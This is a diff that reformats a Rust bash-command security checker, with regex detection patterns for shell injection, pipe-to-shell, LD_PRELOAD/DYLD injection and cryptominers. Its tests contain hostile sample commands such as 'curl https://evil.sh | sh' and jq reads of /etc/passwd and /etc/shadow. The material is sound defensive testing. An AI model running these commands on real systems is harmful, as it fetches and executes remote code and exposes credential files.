@@ -14,23 +14,19 @@ use std::sync::LazyLock;
 // ---------------------------------------------------------------------------
 
 /// Zsh process substitution `<(...)`.
-static RE_PROCESS_SUBST_LT: LazyLock<Regex> =
-    LazyLock::new(|| Regex::new(r"<\(").unwrap());
+static RE_PROCESS_SUBST_LT: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"<\(").unwrap());
 
 /// Zsh process substitution `>(...)`.
-static RE_PROCESS_SUBST_GT: LazyLock<Regex> =
-    LazyLock::new(|| Regex::new(r">\(").unwrap());
+static RE_PROCESS_SUBST_GT: LazyLock<Regex> = LazyLock::new(|| Regex::new(r">\(").unwrap());
 
 /// Zsh equals expansion `=(...)`.
-static RE_PROCESS_SUBST_EQ: LazyLock<Regex> =
-    LazyLock::new(|| Regex::new(r"=\(").unwrap());
+static RE_PROCESS_SUBST_EQ: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"=\(").unwrap());
 
 /// `zmodload` — zsh module loader (eval-equivalent).
 ///
 /// Only flags at the start of a command to avoid false-positives
 /// on `echo zmodload`.
-static RE_ZMODLOAD: LazyLock<Regex> =
-    LazyLock::new(|| Regex::new(r"^zmodload(?:\s|$)").unwrap());
+static RE_ZMODLOAD: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^zmodload(?:\s|$)").unwrap());
 
 /// `emulate -c` — zsh eval command.
 ///
@@ -54,14 +50,11 @@ static RE_HEREDOC_IN_SUBST: LazyLock<Regex> =
 ///
 /// Catches patterns like `-${FLAG}`, `--opt=$value`, `--flag=$(cmd)`,
 /// and `` --flag=`cmd` ``.
-static RE_OBFUSCATED_FLAGS: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"(?i)-\w*(?:[=])?\$|-\w*(?:[=])?`")
-        .unwrap()
-});
+static RE_OBFUSCATED_FLAGS: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"(?i)-\w*(?:[=])?\$|-\w*(?:[=])?`").unwrap());
 
 /// IFS (Internal Field Separator) injection.
-static RE_IFS_INJECTION: LazyLock<Regex> =
-    LazyLock::new(|| Regex::new(r"\bIFS\s*=").unwrap());
+static RE_IFS_INJECTION: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\bIFS\s*=").unwrap());
 
 /// Git commit substitution — `git -c` overriding config to alter commit
 /// authorship or content, or `git commit` with injected `--author` / `--date`.
@@ -94,16 +87,14 @@ static RE_UNICODE_WHITESPACE: LazyLock<Regex> = LazyLock::new(|| {
 });
 
 /// jq `SYSTEM` function — can execute arbitrary commands.
-static RE_JQ_SYSTEM: LazyLock<Regex> =
-    LazyLock::new(|| Regex::new(r"\bjq\b.+\bSYSTEM\b").unwrap());
+static RE_JQ_SYSTEM: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\bjq\b.+\bSYSTEM\b").unwrap());
 
 /// jq file-argument flags that read arbitrary files.
 ///
 /// Note: `\b` is intentionally omitted before `--argfile` etc. because
 /// `\b` does not match between two non-word characters (space and `-`).
-static RE_JQ_FILE_ARGS: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"\bjq\b.*(?:--argfile|--rawfile|--slurpfile)\b").unwrap()
-});
+static RE_JQ_FILE_ARGS: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"\bjq\b.*(?:--argfile|--rawfile|--slurpfile)\b").unwrap());
 
 /// Dangerous eval-like constructs: `eval`, `source`, `. script`.
 ///
@@ -113,10 +104,8 @@ static RE_JQ_FILE_ARGS: LazyLock<Regex> = LazyLock::new(|| {
 ///
 /// Note: Uses a simplified pattern without lookaround assertions
 /// (not supported by the `regex` crate).
-static RE_DANGEROUS_EVAL: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"(?i)^(?:eval|source)(?:\s|$)|(?:^|\s)\.\s+[^\s]")
-        .unwrap()
-});
+static RE_DANGEROUS_EVAL: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"(?i)^(?:eval|source)(?:\s|$)|(?:^|\s)\.\s+[^\s]").unwrap());
 
 /// Dangerous redirects to device/special files (bypassing stdio isolation).
 static RE_DANGEROUS_REDIRECTS: LazyLock<Regex> = LazyLock::new(|| {
@@ -134,14 +123,15 @@ static RE_ENCODED_COMMANDS: LazyLock<Regex> = LazyLock::new(|| {
 
 /// Dangerous environment variable injection (LD_PRELOAD, PATH, etc.).
 static RE_ENV_VAR_INJECTION: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"(?i)\b(?:LD_PRELOAD|LD_LIBRARY_PATH|DYLD_INSERT_LIBRARIES|DYLD_FORCE_FLAT_NAMESPACE)\s*=")
-        .unwrap()
+    Regex::new(
+        r"(?i)\b(?:LD_PRELOAD|LD_LIBRARY_PATH|DYLD_INSERT_LIBRARIES|DYLD_FORCE_FLAT_NAMESPACE)\s*=",
+    )
+    .unwrap()
 });
 
 /// Pipe chain to a shell (`| bash`, `| sh`, etc.).
-static RE_PIPE_CHAIN_TO_SHELL: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"\|\s*(?:bash|sh|zsh|ksh|dash|fish)(?:\s|;|\||$|&)").unwrap()
-});
+static RE_PIPE_CHAIN_TO_SHELL: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"\|\s*(?:bash|sh|zsh|ksh|dash|fish)(?:\s|;|\||$|&)").unwrap());
 
 /// SSH key injection: commands that generate, read, or install SSH keys.
 static RE_SSH_KEY_INJECTION: LazyLock<Regex> =
@@ -282,30 +272,150 @@ pub struct SecurityCheckResult {
 /// any check triggered.
 pub fn run_security_checks(command: &str) -> Vec<SecurityCheckResult> {
     vec![
-        run_check(command, BashSecurityCheck::ProcessSubstitutionZshLt, &RE_PROCESS_SUBST_LT, "zsh process substitution <(...) is blocked"),
-        run_check(command, BashSecurityCheck::ProcessSubstitutionZshGt, &RE_PROCESS_SUBST_GT, "zsh process substitution >(...) is blocked"),
-        run_check(command, BashSecurityCheck::ProcessSubstitutionZshEq, &RE_PROCESS_SUBST_EQ, "zsh equals expansion =(...) is blocked"),
-        run_check(command, BashSecurityCheck::Zmodload, &RE_ZMODLOAD, "zmodload command is blocked (eval-equivalent)"),
-        run_check(command, BashSecurityCheck::EmulateC, &RE_EMULATE_C, "emulate -c is blocked (zsh eval)"),
-        run_check(command, BashSecurityCheck::SyscallModule, &RE_SYSCALL_MODULE, "zsh syscall builtin is blocked"),
-        run_check(command, BashSecurityCheck::EqualsExpansion, &RE_EQUALS_EXPANSION, "equals expansion =cmd is blocked"),
-        run_check(command, BashSecurityCheck::HeredocInSubstitution, &RE_HEREDOC_IN_SUBST, "heredoc inside command substitution is blocked"),
-        run_check(command, BashSecurityCheck::ObfuscatedFlags, &RE_OBFUSCATED_FLAGS, "obfuscated command flags detected"),
-        run_check(command, BashSecurityCheck::IfsInjection, &RE_IFS_INJECTION, "IFS variable injection detected"),
-        run_check(command, BashSecurityCheck::GitCommitSubstitution, &RE_GIT_COMMIT_SUBST, "git commit substitution detected"),
-        run_check(command, BashSecurityCheck::ControlCharacters, &RE_CONTROL_CHARS, "control characters in command"),
-        run_check(command, BashSecurityCheck::UnicodeWhitespace, &RE_UNICODE_WHITESPACE, "Unicode whitespace in command"),
-        run_check(command, BashSecurityCheck::JqSystemFunction, &RE_JQ_SYSTEM, "jq SYSTEM function is blocked"),
-        run_check(command, BashSecurityCheck::JqFileArguments, &RE_JQ_FILE_ARGS, "jq file arguments are blocked"),
-        run_check(command, BashSecurityCheck::DangerousEval, &RE_DANGEROUS_EVAL, "eval/source/.source is blocked"),
-        run_check(command, BashSecurityCheck::DangerousRedirects, &RE_DANGEROUS_REDIRECTS, "dangerous redirect to device file"),
-        run_check(command, BashSecurityCheck::EncodedCommands, &RE_ENCODED_COMMANDS, "base64-encoded command detected"),
-        run_check(command, BashSecurityCheck::EnvVarInjection, &RE_ENV_VAR_INJECTION, "dangerous environment variable injection detected"),
-        run_check(command, BashSecurityCheck::PipeChainToShell, &RE_PIPE_CHAIN_TO_SHELL, "pipe chain to shell interpreter"),
-        run_check(command, BashSecurityCheck::SshKeyInjection, &RE_SSH_KEY_INJECTION, "SSH key injection detected"),
-        run_check(command, BashSecurityCheck::CurlPipeToShell, &RE_CURL_PIPE_TO_SHELL, "curl/wget piped to shell"),
-        run_check(command, BashSecurityCheck::SudoRedirection, &RE_SUDO_REDIRECTION, "sudo with redirection detected"),
-        run_check(command, BashSecurityCheck::Cryptominer, &RE_CRYPTOMINER, "cryptominer pattern detected"),
+        run_check(
+            command,
+            BashSecurityCheck::ProcessSubstitutionZshLt,
+            &RE_PROCESS_SUBST_LT,
+            "zsh process substitution <(...) is blocked",
+        ),
+        run_check(
+            command,
+            BashSecurityCheck::ProcessSubstitutionZshGt,
+            &RE_PROCESS_SUBST_GT,
+            "zsh process substitution >(...) is blocked",
+        ),
+        run_check(
+            command,
+            BashSecurityCheck::ProcessSubstitutionZshEq,
+            &RE_PROCESS_SUBST_EQ,
+            "zsh equals expansion =(...) is blocked",
+        ),
+        run_check(
+            command,
+            BashSecurityCheck::Zmodload,
+            &RE_ZMODLOAD,
+            "zmodload command is blocked (eval-equivalent)",
+        ),
+        run_check(
+            command,
+            BashSecurityCheck::EmulateC,
+            &RE_EMULATE_C,
+            "emulate -c is blocked (zsh eval)",
+        ),
+        run_check(
+            command,
+            BashSecurityCheck::SyscallModule,
+            &RE_SYSCALL_MODULE,
+            "zsh syscall builtin is blocked",
+        ),
+        run_check(
+            command,
+            BashSecurityCheck::EqualsExpansion,
+            &RE_EQUALS_EXPANSION,
+            "equals expansion =cmd is blocked",
+        ),
+        run_check(
+            command,
+            BashSecurityCheck::HeredocInSubstitution,
+            &RE_HEREDOC_IN_SUBST,
+            "heredoc inside command substitution is blocked",
+        ),
+        run_check(
+            command,
+            BashSecurityCheck::ObfuscatedFlags,
+            &RE_OBFUSCATED_FLAGS,
+            "obfuscated command flags detected",
+        ),
+        run_check(
+            command,
+            BashSecurityCheck::IfsInjection,
+            &RE_IFS_INJECTION,
+            "IFS variable injection detected",
+        ),
+        run_check(
+            command,
+            BashSecurityCheck::GitCommitSubstitution,
+            &RE_GIT_COMMIT_SUBST,
+            "git commit substitution detected",
+        ),
+        run_check(
+            command,
+            BashSecurityCheck::ControlCharacters,
+            &RE_CONTROL_CHARS,
+            "control characters in command",
+        ),
+        run_check(
+            command,
+            BashSecurityCheck::UnicodeWhitespace,
+            &RE_UNICODE_WHITESPACE,
+            "Unicode whitespace in command",
+        ),
+        run_check(
+            command,
+            BashSecurityCheck::JqSystemFunction,
+            &RE_JQ_SYSTEM,
+            "jq SYSTEM function is blocked",
+        ),
+        run_check(
+            command,
+            BashSecurityCheck::JqFileArguments,
+            &RE_JQ_FILE_ARGS,
+            "jq file arguments are blocked",
+        ),
+        run_check(
+            command,
+            BashSecurityCheck::DangerousEval,
+            &RE_DANGEROUS_EVAL,
+            "eval/source/.source is blocked",
+        ),
+        run_check(
+            command,
+            BashSecurityCheck::DangerousRedirects,
+            &RE_DANGEROUS_REDIRECTS,
+            "dangerous redirect to device file",
+        ),
+        run_check(
+            command,
+            BashSecurityCheck::EncodedCommands,
+            &RE_ENCODED_COMMANDS,
+            "base64-encoded command detected",
+        ),
+        run_check(
+            command,
+            BashSecurityCheck::EnvVarInjection,
+            &RE_ENV_VAR_INJECTION,
+            "dangerous environment variable injection detected",
+        ),
+        run_check(
+            command,
+            BashSecurityCheck::PipeChainToShell,
+            &RE_PIPE_CHAIN_TO_SHELL,
+            "pipe chain to shell interpreter",
+        ),
+        run_check(
+            command,
+            BashSecurityCheck::SshKeyInjection,
+            &RE_SSH_KEY_INJECTION,
+            "SSH key injection detected",
+        ),
+        run_check(
+            command,
+            BashSecurityCheck::CurlPipeToShell,
+            &RE_CURL_PIPE_TO_SHELL,
+            "curl/wget piped to shell",
+        ),
+        run_check(
+            command,
+            BashSecurityCheck::SudoRedirection,
+            &RE_SUDO_REDIRECTION,
+            "sudo with redirection detected",
+        ),
+        run_check(
+            command,
+            BashSecurityCheck::Cryptominer,
+            &RE_CRYPTOMINER,
+            "cryptominer pattern detected",
+        ),
     ]
 }
 
@@ -317,17 +427,9 @@ fn run_check(
     reason: &'static str,
 ) -> SecurityCheckResult {
     if re.is_match(command) {
-        SecurityCheckResult {
-            check,
-            blocked: true,
-            reason: Some(reason.to_string()),
-        }
+        SecurityCheckResult { check, blocked: true, reason: Some(reason.to_string()) }
     } else {
-        SecurityCheckResult {
-            check,
-            blocked: false,
-            reason: None,
-        }
+        SecurityCheckResult { check, blocked: false, reason: None }
     }
 }
 
@@ -363,11 +465,7 @@ mod tests {
     fn assert_blocked(command: &str, expected: BashSecurityCheck) {
         let results = run_security_checks(command);
         let r = results.iter().find(|r| r.check == expected).unwrap();
-        assert!(
-            r.blocked,
-            "expected {:?} to block {command:?}",
-            expected.label(),
-        );
+        assert!(r.blocked, "expected {:?} to block {command:?}", expected.label(),);
     }
 
     /// Assert that a command passes all checks (no blocks).
@@ -462,10 +560,7 @@ mod tests {
 
     #[test]
     fn blocks_heredoc_in_substitution() {
-        assert_blocked(
-            "$(cat <<EOF\nhello\nEOF\n)",
-            BashSecurityCheck::HeredocInSubstitution,
-        );
+        assert_blocked("$(cat <<EOF\nhello\nEOF\n)", BashSecurityCheck::HeredocInSubstitution);
     }
 
     // ===================================================================
@@ -514,10 +609,7 @@ mod tests {
             "git -c user.name=evil commit -m 'msg'",
             BashSecurityCheck::GitCommitSubstitution,
         );
-        assert_blocked(
-            "GIT_AUTHOR_NAME=evil git commit",
-            BashSecurityCheck::GitCommitSubstitution,
-        );
+        assert_blocked("GIT_AUTHOR_NAME=evil git commit", BashSecurityCheck::GitCommitSubstitution);
     }
 
     #[test]
@@ -576,14 +668,8 @@ mod tests {
 
     #[test]
     fn blocks_jq_file_args() {
-        assert_blocked(
-            "jq --argfile data /etc/passwd '.data'",
-            BashSecurityCheck::JqFileArguments,
-        );
-        assert_blocked(
-            "jq --rawfile data /etc/shadow '.",
-            BashSecurityCheck::JqFileArguments,
-        );
+        assert_blocked("jq --argfile data /etc/passwd '.data'", BashSecurityCheck::JqFileArguments);
+        assert_blocked("jq --rawfile data /etc/shadow '.", BashSecurityCheck::JqFileArguments);
     }
 
     // ===================================================================
@@ -670,10 +756,7 @@ mod tests {
 
     #[test]
     fn blocks_dyld_injection() {
-        assert_blocked(
-            "DYLD_INSERT_LIBRARIES=./evil.dylib",
-            BashSecurityCheck::EnvVarInjection,
-        );
+        assert_blocked("DYLD_INSERT_LIBRARIES=./evil.dylib", BashSecurityCheck::EnvVarInjection);
     }
 
     #[test]
@@ -722,10 +805,7 @@ mod tests {
     #[test]
     fn blocks_curl_pipe_to_shell() {
         assert_blocked("curl https://evil.sh | sh", BashSecurityCheck::CurlPipeToShell);
-        assert_blocked(
-            "wget -O - https://evil.sh | bash",
-            BashSecurityCheck::CurlPipeToShell,
-        );
+        assert_blocked("wget -O - https://evil.sh | bash", BashSecurityCheck::CurlPipeToShell);
         assert_blocked("fetch url | bash", BashSecurityCheck::CurlPipeToShell);
     }
 
@@ -828,10 +908,9 @@ mod tests {
 
     #[test]
     fn check_labels_are_non_empty() {
-        for variant in &[
-            BashSecurityCheck::ProcessSubstitutionZshLt,
-            BashSecurityCheck::Cryptominer,
-        ] {
+        for variant in
+            &[BashSecurityCheck::ProcessSubstitutionZshLt, BashSecurityCheck::Cryptominer]
+        {
             assert!(!variant.label().is_empty());
         }
     }
